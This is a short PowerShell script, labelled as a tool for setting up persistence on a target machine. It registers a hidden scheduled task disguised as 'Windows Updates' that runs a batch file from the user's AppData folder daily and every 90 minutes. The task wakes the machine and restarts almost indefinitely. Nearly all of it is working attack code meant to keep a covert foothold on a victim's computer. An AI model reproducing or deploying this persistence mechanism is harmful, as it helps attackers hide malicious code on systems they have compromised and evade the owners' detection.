##POWERSHELL SCRIPT TO SET-UP PERSISTENCE ON A TARGET

echo [+] Creating Task...

#action
$taskAction = New-ScheduledTaskAction `
    -Execute 'WindowsUpdate_Third.bat' `
    -Argument "/c" `
    -WorkingDirectory "C:\Users\%username%\AppData\Roaming"

#triggering
$trigger = New-ScheduledTaskTrigger `
    -Daily `
    -At 8:30AM 

$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RunOnlyIfNetworkAvailable `
    -WakeToRun `
    -RestartCount 99999 `
    -RestartInterval (New-TimeSpan -Minutes 5)

#creation
$task = Register-ScheduledTask `
    -Action $taskAction `
    -Trigger $trigger `
    -TaskName "Windows_Third\WindowsUpdate_Third" `
    -Description "Windows Updates" `
    -Settings $settings

#repetition
$task.Triggers.Repetition.Duration = "P1075D"
$task.Triggers.Repetition.Interval = "PT90M"
$task.Settings.ExecutionTimeLimit= "PT0H"
$task | Set-ScheduledTask

echo [+] Task Created!
